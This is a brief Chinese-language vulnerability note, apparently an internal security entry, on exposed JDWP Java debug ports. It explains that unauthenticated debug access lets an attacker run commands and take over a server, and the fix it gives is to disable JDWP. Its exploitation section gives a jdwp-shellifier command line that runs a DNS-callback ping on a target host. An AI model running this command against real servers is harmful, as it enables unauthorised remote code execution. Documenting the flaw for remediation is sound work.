### 一 漏洞描述
JDWP 属于是JPDA的组成模块，JPDA由三个相对独立的层次组成，由低级到高级分别是java虚拟机工具接口 (JVMTI), Java调试线协议(JDWP)以及Java调试接口 （JDI）,其中调试命令和调试结果，都是通过JDWP的通讯协议进行传输的，所有命令被封装成JDWP命令包发送到被调试的服务器上执行，由于此项功能经常被用来当作JAVA远程调试方法，并且默认情况下对所有调试客户端都允许直接连接服务器，攻击者可以利用客户端发送任意命令来执行任何恶意的操作达到接管服务器的目的

JDWP在内网中大量存在，但是业务有必要使用。不允许JDWP开放在线上环境，测试环境只能放过了。

### 二 漏洞利用
https://github.com/IOActive/jdwp-shellifier/blob/master/jdwp-shellifier.py
python jdwp-shellifier.py  -t xxx -p xxx --cmd 'ping xxx.dnslog.cn'

### 三 漏洞修复
关闭JDWP

> 参考链接  
> https://blog.csdn.net/caiqiiqi/article/details/83146415
